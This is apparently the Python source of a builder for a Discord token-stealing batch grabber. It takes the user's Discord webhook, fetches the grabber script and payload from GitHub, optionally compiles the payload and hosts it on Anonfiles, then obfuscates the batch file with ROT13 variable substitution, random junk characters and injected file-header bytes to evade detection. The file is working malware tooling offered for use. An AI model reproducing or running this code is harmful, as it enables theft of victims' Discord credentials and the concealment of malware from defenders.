import os, string, random, codecs
from random import randint
try:
    from tqdm import tqdm
except:
    os.system("pip install tqdm")
    from tqdm import tqdm
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
    import colorama
else:
    colorama.deinit()
try:
    from pystyle import *
except:
    os.system("pip install pystyle")
    from pystyle import *
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from bs4 import BeautifulSoup as bs
except:
    os.system("pip install bs4")
    from bs4 import BeautifulSoup as bs
try:
    from playsound import playsound
except:
    os.system("pip install playsound")
    from playsound import playsound

try:
    import threading
except:
    os.system("pip install threading")
    import threading

banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather and K.Dot#0001 (use headphones for best experience)\n\n
""")

os.system("title BUILDING with K.Dot")
os.system("cls")

def music():
    music = os.path.join(os.getcwd(), 'utils\music.mp3')
    playsound(music)

code = r"""
@echo off
set "n=a" & set "o=b" & set "p=c" & set "q=d" & set "r=e" & set "s=f" & set "t=g" & set "u=h" & set "v=i" & set "w=j" & set "x=k" & set "y=l" & set "z=m" & set "a=n" & set "b=o" & set "c=p" & set "d=q" & set "e=r" & set "f=s" & set "g=t" & set "h=u" & set "i=v" & set "j=w" & set "k=x" & set "l=y" & set "m=z" & set "N1=A" & set "O1=B" & set "P1=C" & set "Q1=D" & set "R1=E" & set "S1=F" & set "T1=G" & set "U1=H" & set "V1=I" & set "W1=J" & set "X1=K" & set "Y1=L" & set "Z1=M" & set "A1=N" & set "B1=O" & set "C1=P" & set "D1=Q" & set "E1=R" & set "F1=S" & set "G1=T" & set "H1=U" & set "I1=V" & set "J1=W" & set "K1=X" & set "L1=Y" & set "M1=Z" & set "lul=:"
"""

__author__ = 'K.Dot'

class builder:
    def __init__(self):
        print(Colorate.Vertical(Colors.yellow_to_red, banner, 2))
        print(Colorate.Color(Colors.red, "", False)) #This just keeps the color as red which I like lowkey
        self.webhook = input("Webhook: ")
        self.file = input("File name: ")
        self.obfuscate = True
        self.build_self = input("Would you like to bulid the exe that the grabber uses yourself? (y/n): ")
        if self.build_self == "y":
            self.anon = input("Would you like to use Anonfiles to host exe? (y/n): ")
        self.build()

    def check_webhook(self):
        try:
            url = self.webhook.startswith("https://discordapp.com/api/webhooks/") or self.webhook.startswith("https://discord.com/api/webhooks/")
            if url == True:
                r = requests.get(self.webhook)
                jsons = r.json()
                try:
                    if jsons["message"] == "Unknown Webhook":
                        return False
                    else:
                        return True
                except:
                    return True
            else:
                return False
        except:
            return False

    def make_pyinstaller_stuff(self):
        if self.build_self == "y":
            os.system('pip install colorama; Pillow; pycryptodome; pystyle; pywin32; requests; tqdm; tinyaes')
            if self.anon == "y":
                os.system("pip install pyinstaller")
                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
                with open("built.py", "w+") as f:
                    f.write(grabbruh.text)
                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
                os.remove("built.spec")
                shutil.rmtree("build")
                shutil.move("dist/built.exe", "grabber.exe")
                os.remove("built.py")
                shutil.rmtree("dist")
                uploaded = requests.post(f'https://anonfiles.com/api/upload', files={'file': open('grabber.exe', 'rb')})
                uploaded = uploaded.json()
                uploaded2 = uploaded['data']['file']['url']['full']
                r = requests.get(uploaded2)
                soup = bs(r.content, "html.parser")
                link = soup.find("a", {"id": "download-url"}).get("href")
                final = f"curl {link}"
                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", final)
                return grabber
            elif self.anon == "n":
                direct_download = input("ENTIRE CURL LINK (not this can be curl YOUR_LINK or even curl -LJO YOUR_LINK THIS IS VERY ADVANCED SO DONT USE UNLESS YOU KNOW): ")
                os.system("pip install pyinstaller")
                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
                with open("built.py", "w+") as f:
                    f.write(grabbruh.text)
                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
                os.remove("built.spec")
                shutil.rmtree("build")
                shutil.move("dist/built.exe", "grabber.exe")
                os.remove("built.py")
                shutil.rmtree("dist")
                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", f"{direct_download}")
                return grabber
            else:
                print("Invalid option dumbass")
                builder()

        elif self.build_self == "n":
            grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "")
            return grabber
        else:
            print(Colorate.Color(Colors.red, "Invalid option", False))
            builder()

    def build(self):
        if self.check_webhook():
            print(Colorate.Color(Colors.green, "Webhook is valid!", True))
            print(Colorate.Color(Colors.red, "", False)) #back to red cuh
        else:
            print("WEBHOOK IS INVALID!")
            builder()
        with open(f'{self.file}.bat', 'w+') as f:
            f.write(self.make_pyinstaller_stuff())
        if self.obfuscate == True:
            self.obfuscate_real()
        else:
            print(Colorate.Color(Colors.green, "Done!", True))

    def obfuscate_real(self):
        try:
            os.remove(f'{self.file}.obfuscated.bat')
            os.remove(f'{self.file}.obfuscated.super.bat')
        except:
            pass
        switch = False
        with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
            ammount = len(original.readlines())
        with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
            for lines in tqdm(original, total=int(ammount), desc="Obfuscating", unit=" lines"):
                label = lines.startswith(':')
                if label == True:
                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                        f.write(lines) # TEMP FIX FOR NOT FINDING FUNCTIONS BATCH
                else:
                    for char in lines:
                        if switch == False:
                            if '\n' in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("\n")
                            elif "%" in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("%")
                                    switch = True #thx baum for making this work :sob:
                            else:
                                random_num = randint(5, 12)
                                random_string = ''.join(random.choice('☞☟☠☡☢☣☤☥☦☧☰☱☲☳☴☵☶☷☸♕☻♡☹♆♔♅♖♘♗♙♚♛♜♝♞♟♠♡♢♣♤♥♦♧♨♩♪♫♬♭♮♯♰♱♲♳♴♵♶♶♸♹♻♼♽♾⚀⚁⚂⚃⚄⚅⚆⚇⚈⚉⚊⚋⚌⚍⚎⚏⚐⚑⚒⚔⚕⚖⚗⚘⚙⚚⚛⚜⚝⚞⚟') for kdot in range(random_num))
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    if char in string.ascii_letters:
                                        if char.islower():
                                            coded0 = codecs.encode(char, 'rot_13')
                                            coded = coded0.replace(coded0, f"%{coded0}%")
                                            f.write(f"{coded}%{random_string}%")
                                        else:
                                            coded0 = codecs.encode(char, 'rot_13').upper()
                                            coded = coded0.replace(coded0, f'%{coded0}1%')
                                            f.write(f"{coded}%{random_string}%")
                                    else:
                                        f.write(f"{char}%{random_string}%")
                        else:
                            if "%" in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("%")
                                    switch = False
                            elif '\n' in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("\n")
                            else:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write(char) # spent like 2 hours trying to fix this and found baums again :sob: https://github.com/baum1810/batchobfuscator

            with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
                everything = f.read()
            with open(f'{self.file}.bat.obfuscated.bat', 'w+', encoding='utf-8') as f:
                f.write(f"{code}\n{everything}")

            out_hex = []

            out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
            with open(f'{self.file}.bat.obfuscated.bat','rb') as f:
                    penis = f.read()

            out_hex.extend(['{:02X}'.format(b) for b in penis])

            with open(f'{self.file}.bat.obfuscated.super.bat', 'wb') as f:
                for i in out_hex:
                    f.write(bytes.fromhex(i))

            print(Colorate.Color(Colors.green, "Done!", True))


if __name__ == '__main__':
    if __author__ != '\x4b\x2e\x44\x6f\x74':
        print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
        os._exit(0)
    threading.Thread(target = music).start()
    threading.Thread(target = builder).start()